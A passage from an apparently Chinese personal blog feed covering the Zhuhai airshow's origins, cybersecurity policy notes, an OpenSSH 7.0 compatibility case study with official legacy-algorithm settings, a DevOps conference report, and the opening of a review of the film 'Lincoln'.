    <content type="text"><![CDATA[摘要 珠海市为何是中国航展举办地？ 2016珠海航展 中国八一飞行表演队 2016珠海航展 俄罗斯勇士&amp;雨燕飞行表演队 2016珠海航展 英国皇家空军红箭飞行表演队 知乎上有一个问题：珠海市为何是中国航展举办地？ 珠海市的地理位置，经济发展水平，政治地位等方面并不具备举办国家级航展的优势条件，20年来很多大城市都跃跃欲试，欲取而代之。它对标的是法国巴黎航展，兼具大规模飞行表演，是目前中国规模最大（北京航展主要以静态站台为主，石家庄航展以通用航空为主）。 ![](http://ogtqvs10n.bkt.clouddn.com/DSC00972-02.JPG 先下手为强1992年，珠海政府代表团访问加拿大的苏里市，当时珠海正与之结为姐妹城市。在苏里市的市政厅，梁广大介绍珠海的发展情况，说珠海经济特区要开展铁路、港口、飞机场和大桥等大型设施建设。在市政厅里的会客厅咖啡室，一位议员，马文•亨特，提出建议：“你们建飞机场的时候，能不能把航展的功能考虑进去，我是国际航展成员，国际航空航天博览会是一个很大的商业项目活动，对一个地区，对一个国家都很有好处。” 听着这么像资本市场融资故事呢？机场还没修呢。 4000米跑道民航总局批复的规划跑道是2000多米，经过地方政府多次公关，最终民航总局同意批准加建到3200米。如果作为普通的民航机场，一般的机场跑道3200米已经很不错了，但考虑到要建一个国际性机场，跑道短了些，后来又决定加码到了3400米，可以起降波音747等大型客机。最后建设的时候，跑道延伸到了4000米。 当时，全国还没有一个机场拥有4000米的跑道，但这几百米的改动，因为未及时向国家主管部门和国务院报告和审批，导致机场建好后，谁也不敢来验收。各方面的反对意见很多。建那么长干嘛？民航又不需要那么长。最后捅到了国务院办公会议。 “我向朱镕基总理汇报，超出最初规划建设机场，目的主要是为了办国际航空航天博览会。除了跑道，机场的导航系统、地勤系统，我们采用的都是世界最先进的。”——时任珠海市委书记梁广大 机智？ 格局 ？ 真相永远不可考。 等级 机场名称 IATA代码 跑道长度宽度指标（米）4E 珠海三灶(金湾)机场 ZUH 4000×60 4F 北京首都国际机场 PEK 3800×60、3200×50、3800×604F 上海浦东国际机场 PVG 4000×60、3800×60、3400×604F 广州白云国际机场 CAN 3800×60、3600×45 4E 长沙黄花国际机场 CSX 3200×604E 厦门高崎国际机场 XMN 3400×454E 台湾桃园国际机场 TPE 3660×60、3800×60 特色审批机场有了，报批航展的手续也在紧锣密鼓地推进中。梁广大本以为只要珠海市里下定决心举办，再报批一下民航总局，珠海航展的成功就是指日可待。实际上，从1994年1月22日开始，珠海市政府就向国务院请示，在珠海举办中国国际航空航天博览会，直到1995年5月19日，国务院才给予了正式批复。 “后来慢慢才知道，牵扯的部门那么多，有经贸部、贸促会、海关总署、航空工业部、外交部、军委外事部门、总参、空军总部、国防科工委、军委、国务院办公厅、中央办公厅”。梁广大带着一帮人在北京珠海奔波了几乎有一年，拜访了十几个单位，挨家挨户地陈述申办理由。 最难的一关是国防科工委。航展关系到外国飞机和武器的进出，事关领空开放和安全问题，答复批不了，要军委主席才可以批。“总书记的批示让我们举办国际航空航天博览会的工作变得畅通无阻。” 找对人很重要。 后记综上所述，珠海办航展这事，基本上是梁书记提着脑袋忽悠来的。可是很可惜，第一届航展两年之后，一代能吏梁大胆调职退休，珠海经济特区迎来了漫长的平庸期，直到今天。 历任珠海市委书记任期 姓名2012.02 - 2016.04 李 嘉 （4年，涉嫌严重违纪，免职）2008.03 - 2012.02 甘 霖（4年）2005.08 - 2008.03 邓维龙（2.5年）2002.08 - 2005.08 方 旋（3年）1998.10 - 2002.08 黄龙云（4年）1987.01 - 1998.09 梁广大（11年，84年任市长）1984.02 - 1987.01 方 苞1979.01 - 1984.02 吴健民 2016年珠海航展图集 2016珠海航展 中国八一飞行表演队 2016珠海航展 俄罗斯勇士&amp;雨燕飞行表演队 2016珠海航展 英国皇家空军红箭飞行表演队 资源 NASA 图文资源库]]></content>
      <tags>
        <tag>Policy&amp;Law</tag>
        <tag>Art</tag>
        <tag>摄影</tag>
        <tag>Sport</tag>
        <tag>讲武堂</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Cyber-Security:网络安全专题合集]]></title>
    <url>%2F2016%2F10%2F07%2FCyberSecurity%2F</url>
    <content type="text"><![CDATA[摘要 美国网络安全立法策略 香港警务处网络安全与科技罪案调查科 网络安全技术文集 一些最英明的审计师说，只有三种内部控制目标：确保财务报告的可靠性，符合法律法规，以及运营的效率和效果。——《凤凰项目 一个IT运维的传奇故事》第 241 页 一、美国网络安全立法策略 The Red Army had been gone for years, but it still had the power to inspire controversy—and destruction……the same sorts of challenges the modern administrative state faces in fields like environmental law, antitrust law, products liability law, and public health law. –《Regulating Cybersecurity》 (forthcoming 2013)。 框架学术界普遍认为国家的关键基础设施，如银行，电信网络，电网等等，非常容易受到灾难性的网络攻击。然而，现有的学术文献并未充分阐述这一问题，因其将网络安全的范畴过度狭隘化。作者认为，与其仅仅将这些私有企业视为网络犯罪的潜在受害者或是网络冲突的潜在目标，我们更应从行政法的范畴来看待他们。在诸如环境法，反垄断法，产品责任法，公共卫生法等领域也面临相似的挑战。这些法律范畴不仅产出一个思考网络安全的更丰富的分析框架，也提出了可能的应对策略。 Environmental Law 环保法 Antitrust Law 反托拉斯法 反垄断法 Products liability Law 产品责任法 Public Health Law 公共卫生法 a DDOS attack, and the company might notify other firms to use the same technique. Finally, an industry might agree to establish a uniform set of cyber-security standards, along with monitoring and enforcement mechanisms to ensure that all members are implementing the agreed-upon measures. They might, in other words, form something like a cartel. 例如，面对DDOS 攻击的严重威胁，作者提出行业公司可能会同意建立一套统一的网络安全标准，以及监测和执法机制，确保所有成员都执行商定的措施。类似于一个卡特尔组织。 a partnership among the U.S. Centers for Disease Control and Prevention, the CDC’s state level counterparts, and front line health care providers, such as hospitals, clinics, and individual medical practitioners. 又例如，借鉴公共卫生领域的诸多实践经验：强制接种（mandatory inoculations ）、监测网（Monitor）、隔离（isolation and quarantine ）、机构协作等。与其授权某个单独的监管者检测恶意代码爆发的网络流量，应该给私营企业分派任务，报告他们经历的漏洞和威胁信息，就像医院向公共卫生当局汇报一样。为了激励企业参与分布式检测网络，他们会获得不同的补助（基于网络安全数据是一种市场上供不应求的公共财产理论）以及免责权利（例如反垄断法豁免权）。 再比如：网络入侵的最优水平不为零，网络安全的支出最优水平是无穷的。从经济角度来说，目标是控制攻击数水平，而不是防止所有的攻击。 科斯的经济理论可以说是这篇文章的精魂所在。罗纳德·哈里·科斯（Ronald H Coase）——新制度经济学的鼻祖，美国芝加哥大学教授、芝加哥经济学派代表人物之一，1991年诺贝尔经济学奖的获得者。两篇代表作《企业的性质》和《社会成本问题》之中，科斯首次创造性地通过提出“交易费用”来解释企业存在的原因以及企业扩展的边界问题。 这样的例子还很多，感兴趣的朋友可以阅读原文。 多样化职业历练作者NATHAN ALEXANDER，经历非常丰富。学术背景以外，还有美国司法部、国土安全部任职、海外派驻经历，从华盛顿出来之后，又回到学校去教书。可能是这些丰富地经历，造就了他开阔地思路，没有非敌即我的简单思维，有很强的经济学功底，环保法、反托拉斯法、公共卫生法信手拈来，对网络安全领域的参与主体、攻击技术、专业细节的掌握相当内行，和一般的学者不同。这套旋转门的制度设计还是很神奇地。 GEORGE MASON UNIVERSITY SCHOOL OF LAW，Arlington，VAAssistant Professor of Law (January 2008) DEPARTMENT OF HOMELAND SECURITYDeputy Assistant Secretary for Policy Development(2006-2007) GEORGETOWN UNIVERSITY LAW CENTER，Washington，DCDUKE UNIVERSITY SCHOOL OF LAW，Durham，NC 二、香港警务处拟增设网络安全与科技罪案总警司网络安全和科技罪案调查科（Cyber Security and Technology Crime Bureau，缩写：CSTCB，简称科罪组）隶属于香港警务处刑事及保安处刑事部，主要责任为搜集及分析情报、调查严重科技罪案、作出法律及技术性研究，并且与业内专业人士和海外执法机关联络，防止科技罪案发生；与此同时，24小时监察香港（自愿登记参与）的主要电脑系统的网络数据流量变化，防范针对上述系统的网络攻击等科技罪行，确保网络安全。more details &gt;&gt;&gt;&gt; 三、实现安全性的目标必须强调可操作性 所有安全系统最终依赖于用户对安全重要性的认识，以及对其必然带来的限制的接受。安全取决于人：取决于系统用户对规则的遵守，取决于分析人员和监控人员在规则被破坏时能够发现。…… 糟糕的安全策略会导致用户不断地躲避检测，以便完成其工作，或者使用户不停地发脾气，这只会给你的防御人员带来额外的负担。—— Michael Collins《Network Security Through Data Analysis》 扩展阅读：《The Cyber-Security Master》 Cyber-Security: 黑客与技术、产业及其精神世界 Cyber-Security: Linux 容器安全的十重境界 Cyber-Security: 警惕 Wi-Fi 漏洞 Cyber-Security: Web应用安全：攻击、防护和检测 Cyber-Security: IPv6 &amp; Security Cyber-Security: OpenSSH 并不安全 Cyber-Security: Linux/XOR.DDoS 木马样本分析 浅谈基于数据分析的网络态势感知 Packet Capturing:关于网络数据包的捕获、过滤和分析 新一代Ntopng网络流量监控—可视化和架构分析 Cyber-Security: 事与愿违的后门程序 | Economist Cyber-Security: 美国网络安全立法策略 Cyber-Security: 香港警务处拟增设网络安全与科技罪案总警司 参考文献 How do you keep your DCS safe from CyberAttacks? 安全情报分析中的钻石模型 | 2015-12-14 安全威胁情报 乌克兰电网攻击第二季 | 2016-01-31 安全威胁情报 加油站也会被黑？来看看这个攻击案例|2017-02-19 clouds FreeBuf 360副总裁谭晓生谈安全：万物互联时代，要玩儿“塔防游戏”，不是“工程游戏 ”|BT500人峰会 池建强&amp;双乐：DDoS，网络安全世界里的暗黑杀手 全网统一账户实践(OpenLDAP) |jaseywang.me]]></content>
      <tags>
        <tag>Policy&amp;Law</tag>
        <tag>架构师</tag>
        <tag>DevOps</tag>
        <tag>Cyber-Security</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Cyber-Security:OpenSSH并不绝对安全]]></title>
    <url>%2F2016%2F10%2F06%2FCyberSecurity-SSH%2F</url>
    <content type="text"><![CDATA[摘要OpenSSH7.0做出了一些变更，默认禁用了一些较低版本的密钥算法。受此影响，在同一系统中的主机、网络设备必须同步升级，或者开启兼容选项。 实测中，也有某些厂家产品内核的原因，甚至无法升级。由此案例，关于系统版本管理、安全、架构、开源文档，甚至采购方面，都可以引发很多思考。 背景某系统按照安全管理要求，需对全系统主机的OpenSSH版本升级。第一次测试：系统自有服务器。主机：RedHat Linux ／SunOS：系统内全部主机升级，内部互通没有问题第二次测试：主机到网络设备SSH互通性 国外厂商思科（系统版本IOS 12.0系列，IOS 4.0系列），RedBack（系统版本SEOS-12系列，SEOS-6.0系列）。目前仅支持diffie-hellman-group1-sha1、ssh-dss两种算法。当然不排除今年国产化运动影响，国外厂商维保过期等原因导致的售后升级服务滞后。 国内厂商华为，无论是城域骨干网设备，还是IPRAN 各型号，甚至老式交换机都完全兼容。中兴，只有较新的CTN9000-E V3.00.10系列能有限支持diffie-hellman-group1-sha1，其它各型号在服务器OpenSSH7.0以上版本后都无法正常访问。 原因解析直接原因：OpenSSH7.0安全特性升级基于安全考虑，OpenSSH7.0将diffie-hellman-group1-sha1，ssh-dss等运行时状态默认变更为禁用。Support for the 1024-bit diffie-hellman-group1-sha1 key exchange is disabled by default at run-time.Support for ssh-dss, ssh-dss-cert- host and user keys is disabled by default at run-time 采购原因：国产化运动国产化是近年以来的国家战略，各行各业都有涉及。在本次案例中，国际大厂Cicso,RedBack,Juniper等，个人以为更大的可能不是无法更新，而是基于商务原因。既然你不在维保合同期之内，又没有继续采购的计划，那我干嘛还给你升级？甚至由此可以推论：针对在网国外厂商设备，漏洞多又没有升级保障，会变成攻击和防护的重灾区。 软件质量：厂商系统架构水平差异同样是国内厂家，测试对比结果却非常强烈！！这其实是没有想到的。通过这个小细节，可以看出华为的系统架构与中兴早已拉开境界上的差距。结合近年来，华为出入开源社区的身影，更可以说明其对系统内核的理解和掌握已经到了相当的程度。个人揣测，其早期版本可能也没有多好的支持。由于架构设计较好，又有更高的自我要求，逐步通过补丁升级，不动声色地就更新好了。持续升级能力，可以作为评价企业长期 OpenSSH7.0以后的演进针对密钥强度和加密算法方面更新会持续加强，必须有所准备We plan on retiring more legacy cryptography in the next releaseincluding: Refusing all RSA keys smaller than 1024 bits (the current minimumis 768 bits) Several ciphers will be disabled by default: blowfish-cbc,cast128-cbc, all arcfour variants and the rijndael-cbc aliasesfor AES. MD5-based HMAC algorithms will be disabled by default. 延伸：Logjam Attack（本人没查到对应的中文名称，暂翻译为“僵尸攻击”，欢迎指正）一种针对Diffie-Hellman密钥交换技术发起的攻击，而这项技术应用于诸多流行的加密协议，比如HTTPS、TLS、SMTPS、SSH及其他协议。一个国外计算机科学家团队2015-5-20公开发布。 延伸：开源组件演进追踪本案例实际操作过程中，开头走了很多弯路，并没有一下找到要害。根源在于团队缺乏关注开源产品演进方向的意识和习惯，也缺乏直接阅读、理解官方文档的习惯。 OpenSSH 7.0 变更说明Changes since OpenSSH 6.9This focus of this release is primarily to deprecate weak, legacyand/or unsafe cryptography.Security——– sshd(8): OpenSSH 6.8 and 6.9 incorrectly set TTYs to be world-writable. Local attackers may be able to write arbitrary messagesto logged-in users, including terminal escape sequences.Reported by Nikolay Edigaryev. sshd(8): Portable OpenSSH only: Fixed a privilege separationweakness related to PAM support. Attackers who could successfullycompromise the pre-authentication process for remote codeexecution and who had valid credentials on the host couldimpersonate other users. Reported by Moritz Jodeit. sshd(8): Portable OpenSSH only: Fixed a use-after-free bugrelated to PAM support that was reachable by attackers who couldcompromise the pre-authentication process for remote codeexecution. Also reported by Moritz Jodeit. sshd(8): fix circumvention of MaxAuthTries using keyboard-interactive authentication. By specifying a long, repeatingkeyboard-interactive “devices” string, an attacker could requestthe same authentication method be tried thousands of times ina single pass. The LoginGraceTime timeout in sshd(8) and anyauthentication failure delays implemented by the authenticationmechanism itself were still applied. Found by Kingcope. Potentially-incompatible Changes Support for the legacy SSH version 1 protocol is disabled bydefault at compile time. Support for the 1024-bit diffie-hellman-group1-sha1 key exchangeis disabled by default at run-time. It may be re-enabled usingthe instructions athttp://www.openssh.com/legacy.html Support for ssh-dss, ssh-dss-cert-* host and user keys is disabledby default at run-time. These may be re-enabled using theinstructions at http://www.openssh.com/legacy.html Support for the legacy v00 cert format has been removed. The default for the sshd_config(5) PermitRootLogin option has changed from “yes” to “prohibit-password”. PermitRootLogin=without-password/prohibit-password now bans allinteractive authentication methods, allowing only public-key,hostbased and GSSAPI authentication (previously it permitted keyboard-interactive and password-less authentication if those were enabled). 解决方案（翻译）OpenSSH实现了所有符合SSH标准的加密算法，使得应用之间可以互相兼容，但是自从一些老式的算法被发现不够强壮以来，并不是所有的算法都会默认启用。当OpenSSH拒绝连接一个只支持老式算法的应用时，我们该如何做呢？当一个SSH客户端与一个服务端建立连接的时候，两边会互相交换连接参数清单。清单包括用于加密连接的编码信息，消息认证码（MAC）用于防止网络嗅探篡改，公钥算法可以让服务端向客户端证明它是李刚（我就是我，而不是另一个“我”），密钥交换算法是用来生成每次连接的密钥。在一次成功的连接中，这里的每个参数必须有一组互相支持的选择。当客户端和服务端通讯的时候，不能匹配到一组互相支持的参数配置，那么这个连接将会失败。OpenSSH(7.0及以上版本）将输出一个类似的错误信息：12Unable to negotiate with 127.0.0.1: no matching key exchange method found.Their offer: diffie-hellman-group1-sha1 在这种情况下，客户端和服务端不能够就密钥交换算法达成一致。服务端只提供了一个单一的算法 ：diffie-hellman-group1-sha1。OpenSSH可以支持这种算法，但是它默认不启用，因为这个算法非常弱，理论上存在僵尸攻击的风险。这个问题的最好的解决方案是升级软件。OpenSSH禁用的算法，都是那些我们明确不推荐使用的，因为众所周知它们是不安全的。在某些情况下，立科升级也许是不可能的，你可能需要临时地重新启用这个较弱的算法以保持访问。在上面这种错误信息的情况下，OpenSSH可以配置启用diffie-hellman-group1-sha1 密钥交换算法（或者任何其它被默认禁用的），可通过KexAlgorithm选项－或者在命令行：1ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 user@127.0.0.1 或者在 ~/.ssh/config 配置文件中:12Host somehost.example.orgKexAlgorithms +diffie-hellman-group1-sha1 命令行中ssh和“＋”号之间连接算法选项的配置，对客户端默认设置来说相当于替换。通过附加信息，你可以自动升级到最佳支持算法，当服务端开始支持它的时候。另一个例子，主机验证过程中，当客户端和服务端未能就公钥算法达成一致的时候： 12Unable to negotiate with 127.0.0.1: no matching host key type found.Their offer: ssh-dss OpenSSH 7.0及以上版本同样禁用了ssh-css(DSA)公钥交换算法。它也太弱了，我们强烈不建议使用它。1ssh -oHostKeyAlgorithms=+ssh-dss user@127.0.0.1 或者在 ~/.ssh/config 配置文件中:12Host somehost.example.orgHostkeyAlgorithms ssh-dss 视服务端配置情况而定，验证过程中其它连接参数也可能失败。你启用它们的时候，也许需要确定编码方式或者消息验证码配置选项。延伸：查询 SSH 已支持的算法1234ssh -Q cipher # 支持的编码方式ssh -Q mac # 支持的消息验证码ssh -Q key # 支持的公钥类型ssh -Q kex # 支持的密钥交换算法 最后，当你需要试图连接一个特殊主机的时候，也可以通过－G选项查询实际使用ssh配置。1ssh -G user@somehost.example.com 将列出所有的配置选项，包括被选用的编码方式，消息验证码，公钥算法，密钥算法参数的值。 扩展阅读：《The Cyber-Security Master》 Cyber-Security: Linux 容器安全的十重境界 Cyber-Security: 警惕 Wi-Fi 漏洞 Cyber-Security: Web应用安全：攻击、防护和检测 Cyber-Security: IPv6 &amp; Security Cyber-Security: OpenSSH 并不安全 Cyber-Security: Linux/XOR.DDoS 木马样本分析 浅谈基于数据分析的网络态势感知 Packet Capturing:关于网络数据包的捕获、过滤和分析 新一代Ntopng网络流量监控—可视化和架构分析 Cyber-Security: 事与愿违的后门程序 | Economist Cyber-Security: 美国网络安全立法策略 Cyber-Security: 香港警务处拟增设网络安全与科技罪案总警司 参考文献 赵亚：令人作呕的OpenSSL]]></content>
      <tags>
        <tag>DevOps</tag>
        <tag>Cyber-Security</tag>
        <tag>网络协议</tag>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[技术社群：高效运维(GOPS)]]></title>
    <url>%2F2016%2F09%2F24%2FDevOps-GOPS%2F</url>
    <content type="text"><![CDATA[摘要 2016 GOPS 上海站简报 扩展阅读：工程师的自我修养之全英文技术学习实践 一、2016 GOPS 上海站简报1.1 风向：从概念到落地延续这两年的风向，云计算、大数据、DevOps、容器等依然是比较热闹的话题。鉴于这些关键词已经比较普及，大家聊的内容开始更多地聚焦在落地应用上。比如关于OpenStack，有人从网络架构角度聊，也有人从数据中心、对象存储、可视化等方面聊。借用李明宇的一句话：“OpenStack是一个生态”，很多公司已经在利用其庞大生态的细分技术来创业了。 从行业分布来看，除了“传统的”几家巨头互联网公司，GOPS大会已经出现了越来越多的传统企业面孔，可能是上海金融中心的背景，银行、保险公司、银联等金融属性的企业参会的很多，此外中移动、石油系、旅游、快递业也很活跃，还办了中小企业专场。 最后，无论是现场交流环节的观众提问，还是我自己的体会，对于大部分人来说，最难的可能还是选型困境：技术方案不是太少，而是选择太多了。以分布式服务为例，有人推崇Zookeeper，有人选择etcd。前者有JAVA派的支持，后者也不乏Go粉的拥趸，或者有的时候就是拍脑袋决策呢？反正各有各的说法，根本也没个标准。希望以后哪位大牛可以来分享下《技术选型指南》。 1.2 特色：Google SRE 分享本人最感兴趣的是来自Google SRE的分享。 《Google SRE》一书的作者Chris Jones，主要是介绍了一些方法论方面的东西。看气质不像工程师，倒很有几分大学教授的味道。看过《Google SRE》几位作者的简历，除了工程师这个副业，还在斯坦福搞过什么经济学、国际关系、药学博士、文学、诗歌……，Jones则持有Computer Engineering,Economics,Technology Policy三个学位，长期在工程一线，还有professional engineer认证。这哥们还算是它们中间最接近工程师的啦。 Minghua Ye：印象比较深的是推荐了一堆开源库，command-line flags、google protocol buffer、Logging、Googletest…….也许这就是Google人的套路，每当谈到一个什么问题，要么是XXX发表了论文《XXXX》里有说明，要么就是我们发明了XXX技术／工具作为解决方案，开源代码的地址是：XXXX。 孙宇聪：他是《Google SRE》的 中文版译者，前Google SRE。最大的特点就是自带笑点，看得出活得很欢乐、发自内心的。活动现场很多国内企业的CTO、总监 可是极度缺乏这种欢乐。结合zookeeper，讨论了分布式系统的“太祖长拳”——共识系统的一些故事。 1.3 终极命题：人才大多数人可能并没有注意到，本次活动还有一个主题：人才。在热闹的开幕会场上，宣布了三件事： 1.“不出所料”，萧帮主终于从原企业离职，全职搞社区创业去了。2.社区和复旦大学合作，推出了联合培养软件工程硕士的项目。3.社区和EXIN合作，试水DevOps Master认证培训。 特别是后两件事，我其实不太乐观：干好很难，干砸很容易 。从业人才培养难题、在职人员的进修困境，早已有之，连BAT这样的巨头都时常流露出人才难求的尴尬境地。很多有识之士都曾经大声疾呼，但是商业和社区的冲突，能力和学历的争论，再加上当局和教育市场的避重就轻，这方面一直也没走出什么新路。归根到底，这需要产业结构、人才评价体制的根本提升。 不管怎么样，有些事总是需要有人去摸索吧，祝福。 关于工程师人才的微观定义，腾讯提了个自己的标准，供参考：业务和架构能力问题诊断能力开源组件的改造能力工具开发能力运营平台构建能力数据分析和决策能力…… 但是，个人觉得他们这个标准过于功利，还少那么一丢丢。 比如说，第一天Chris Jones演讲的时候，我内心深处是非常郁闷的。当时Jones说一句，孙宇聪在一旁翻译一句。这场面像极了总理新闻发布会，演讲人和翻译一句一顿，看着都蛋疼。说实话，很难有多少交流传播价值。可是，话说回来了，你要不翻译，至少80%以上的人还真就听不明白，公开活动毕竟要照顾大多数。托教育部的福，现在全国人民的学历线可谓蒸蒸日上，跟通货一样膨胀。但是从业人员的语言水平，能达到并保持一定水准的，还真没几个。 反省自己，阅读资料的时候，不也经常放着官方文档不读，非要去找些东拼西凑的二手货吗？过去买的参考书，原著比例是多少？也算写过几片技术文章吧，被Google索引的有多少？ 能有多少东西是可以和国际同行交流的？ 跨语言能力绝对是弯道超车的必备利器！ 工程师的自我修养：全英文技术学习实践。严肃地讨论一下技术人员的语言能力问题，希望您读完以后能够有所触动、有所行动、有所裨益。 Resources 官方实录和PPT下载 2016上海站日程表 扩展阅读：DevOps 漫谈系列 《凤凰项目》：从作坊到工厂的寓言故事 Kanban 看板管理实践 DevOps 漫谈：基础设施部署和配置管理 Linux 容器安全的十重境界 工程师的自我修养：全英文技术学习实践 DevOps 实践的本质是文化 学习力－团队生命之根 带领团队翻译书籍 Don’t make me think 凡是被很多人不断重复的好习惯，要将其自动化整合到工具]]></content>
      <tags>
        <tag>架构师</tag>
        <tag>DevOps</tag>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Lincoln Research:电影评论|灵魂解码《林肯》]]></title>
    <url>%2F2016%2F09%2F10%2FLincoln%2F</url>
    <content type="text"><![CDATA[在伟大领袖们的脚步声中，我们可以听到历史的滚滚雷声。——理查德·尼克松 概要《林肯》由普立策奖得主Tony Kushner担任编剧，史蒂文·斯皮尔伯格执导，丹尼尔·戴·刘易斯等主演，2012年11月16日在上映。影片讲述了林肯在最后一段生命历程中结束南北战争、重新统一美国、推动废除奴隶制的故事。 实话说，大概3年前刚看这部片子时，其实没有什么感觉，甚至略显乏味。可能是随着哲学史观的一些变化、生活阅历的加深，慢慢对于这部片子的理解也越来越深，现在它的地位在我心目中是属于圣殿级的史诗作品。 这篇影评算起来已经酝酿了两年以上，今年又反复重看了N遍，每一次都能揣摩出一些新意，感觉是时候总结一下了。2016年07、08月，正式开始构思、完成第一稿提纲，09月03日～04日，完成第一稿写作。这一版算作概要，如果机缘成熟，还想针对其中一些专门问题作深入挖掘，希望能写成一个系列。 一、艺术风格1.1 镜头全剧的时间跨度为1865年1月～1865年4月15日，合计约100天左右。即南北战争的最后的僵持阶段，但是包含了结束战争、重新统一、通过宪法第十三条修正案、林肯遇刺等诸多重大事件。 第一个镜头就是战争中的肉搏画面，血腥、残酷、压抑，虽然通过随后一段士兵与总司令的对话稍微缓和了气氛，但是基本上奠定了全剧阴郁的镜头风格。剧情场景设定上，大部分都发生在室内，因而人物的特写镜头特别多，喜欢借用装饰、光影变化表达人物情绪，表情刻画非常细腻。 总的，导演并没有致力于恢弘的叙事套路，少数几个重大战役的镜头也更多是为了起承转合，推动剧情的发展。第一遍粗看的话，也体验不到英雄史诗的味道，而且由于时间被高度压缩，镜头切换节奏很快，跳跃的地方很多。 1.2 音乐基调是古典主义音乐风格，钢琴、小提琴大量应用，还大量使用了南北战争时期美国的民间小调、军乐队、歌剧等音乐元素，典雅而不失历史现场感动。另外，道具音效也颇具匠心。比如时常出现的林肯的表的滴答声，据说这是斯皮尔伯格专门跑到博物馆里，录制林肯当年所使用的手表的走时声。 1.3 台词本片的台词鉴赏至少都需要一篇专文的厚度才能完成，可以这么说，这是一部依靠精彩对白支撑的电影。最主要的对白主要发生在众议院，各派力量围绕是否通过法案展开了有序、激烈地质询、演讲、辩论，原来吵架还可以玩得这么有艺术，堪称一部教学片。 此外,第一家庭内部的生活对话、总统幕僚团队的决策会议、林肯与各派别领袖的观点交锋、南北双方的和平谈判以及林肯那些个风趣幽默的小段子。 1.4 色彩主色调：忧郁影片的整体基色几乎沉浸在一片灰蓝色的幽暗之中，这个印象表面上是为了表达战争的残酷血腥，现实中推动法案的强大阻力。作为一部传记电影，导演并没有忘记告诉观众，这其实一部悲剧：主人公正在一步一步迈向死亡。 在剧情发展的关键时刻的时候，很多次都从昏暗的室内切换到室外，难得一见的阳光，映衬着白云、绿草，鲜亮明媚，配上欢快的背景音乐，颇似点睛之笔。(img) 二、故事剧情2.1 主线：废除奴隶制奴隶制在美国可谓由来已久，甚至从北美殖民地开创之初就已经存在，独立战争之后的1787年宪法还予以合法化，伴随着西部殖民扩张和产业革命，甚至得到了发展壮大。截止到南北战争之前，1860年奴隶增长到近400万人,其中3/4在种植园里劳动。奴隶在美国南部的总人口中占1/3上下。 电影剧情的主要是背景是：南北战争后期，林肯致力于促使国会（众议院）通过针对美国宪法的第十三条修正案，即废除奴隶制法案。围绕着该法案，战争双方、各党派代表人物展开了激烈的博弈。 2.2 第十三条修正案比起中国人民熟悉著名的《解放黑人奴隶宣言》，第十三条宪法修正案并不为人熟知。1787年美国宪法诞生及其后近230多年的成长历程，宪法典之后发展出已生效的27条宪法修正案，为这个民族国家提供了一个稳固的制度框架。 宪法在这个法律帝国圣殿中居于雷打不动的王冠似的统治地位，是一切行为的牢固基础，是一具有基础性、权威性和准宗教性的文本。 依据美国宪法第5条规定：其唯一正式修改宪法的形式是宪法修正案。宪法修正案是美国宪法的重要组成部分，代表了美国宪法制度额基本发展路径及方向。 另外，为了体现宪法修正案的权威性，其修改门槛极高：由国会两院（参议院、众议院）各以2/3多数议员认为必要且通过后提出，或由3/4多数的州议会或3/4多数的州制宪会议批准。 从法律地位上说，《解放黑人奴隶宣言》属于行政命令而不是宪法范畴，只需要林肯总统签署即可生效，最多也只能代表这一届政府的主张。如果需要永久地废除奴隶制，就必须对1787年宪法作出修正，这就是林肯在战争后期甘愿冒着政治风险，也要推动法案通过的原因所在。 美国宪法第十三条修正案的文本如下： 123456AMENDMENT XIIISECTION 1. Neither slavery nor involuntary servitude,except as a punishment for crime whereof the party shall have been duly convicted,shall exist within the United States,or any place subject to their jurisdiction.第一款 合众国境内或属合众国管辖之任何地区内，不准有奴隶制或强迫劳役存在，唯有以对业经定罪之罪犯作为惩罚者不在此限。SECTION 2. Congress shall have power to enforce this article by appropriate legislation.第二款 国会有权为实施本条而制定适当之立法。 2.3 角斗场：众议院剧情设定的主要空间背景是：国会参议院议事大厅。为了便于理解，我们需要梳理一下美国政治制度体系的关键组成部分。 美国宪法体制简图：近200多年以来，该制度体系的内容和技术细节一直都在调整，展开来说非常复杂，但是核心框架和设计内涵主要有以下几点： 实行普遍的直接选举制 立法、行政、司法三权分立，互相监督，立法机关居于治理核心地位。 参议院：定额100名，每个州选2名参议员，6年一任； 每2年改选1/3，主要关注外交、国防、重要人事任命等； 承袭古罗马元老院（Senate）之名。 众议院：按照州的人口数，按比例分配，2年一任，2年全部改选一次。除了广泛的立法权，还特别包括弹劾政府公职人员（包括总统），『所有将增加岁入的法案应由众议院首议』，参议院无权提案征税。 总统：掌握行政权，作为政府首脑负责组阁，同时作为军队最高统帅。通常（非宪法定义）是所在政党领袖。 司法：奉行司法独立原则，法官行使审判权。美国宪法没有直接提到美国联邦最高法院是否有司法审查权。但是通过的马伯里诉麦迪逊案（1803）的判决指出，美国联邦最高法院有权宣布某个法律违宪而不被采用。因而剧中的一次讨论中提到，林肯签署的《解放黑人奴隶宣言》可能被最高法院推翻，是有事实依据的。 综上所述，剧情背景中，虽然修宪法案已经在参议院通过，并且共和党当时也占据了政府和国会的优势地位，但是要达到在众议院通过的门槛，是有非常大难度的。对于国人来说，最需要理解是议会运作中的很多术语：动议、附议、陈述、辩论、表决等。这方面建议最好先读一读美国人自己写的《罗伯特议事规则》（Robert’s Rules of Order）这本书，它就像一部设计良好的机器一样，能够有条不紊地让各种意见得以表达，用规则来压制各自内心私利的膨胀冲动，求同存异，然后按照规则表决。这种规则及所设计的操作程序，既保障了民主，也保障了效率。 2.4 拉票是一门艺术林肯竞选连任第二个任期两个月之后，开始快速推动法案在国会通过。 为了在最后的投票环节达到2/3的多数，林肯团队展开了疯狂地拉票活动。这部分剧情是最受争议的部分，虽然史实未必如此，但是估计也差不到那里去。 战略上，促成了共和党内的空前团结 